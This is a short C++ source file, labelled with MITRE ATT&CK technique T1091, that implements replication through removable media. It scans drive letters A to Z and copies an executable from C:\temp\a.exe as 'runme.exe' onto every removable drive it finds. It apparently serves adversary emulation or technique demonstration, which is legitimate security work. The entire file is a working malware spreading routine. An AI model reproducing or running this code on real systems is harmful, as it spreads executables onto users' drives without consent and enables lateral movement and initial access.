// Link      = https://attack.mitre.org/techniques/T1091/
// Technique = Replication Through Removable Media
// ID        = T1091
// Tactics   = Lateral Movement, Initial Access,

#include <windows.h>


char OUTPUT[] = "X:\\runme.exe";

int main() {
    char driveLetter[4] = "X:\\";
    for (auto letter = 'A'; letter <= 'Z'; ++letter) {
        driveLetter[0] = letter;
        if (GetDriveTypeA(driveLetter) == DRIVE_REMOVABLE)
        {
            OUTPUT[0] = letter;
            CopyFileA("C:\\temp\\a.exe", OUTPUT, FALSE);
        }
    }

    return 0;
}


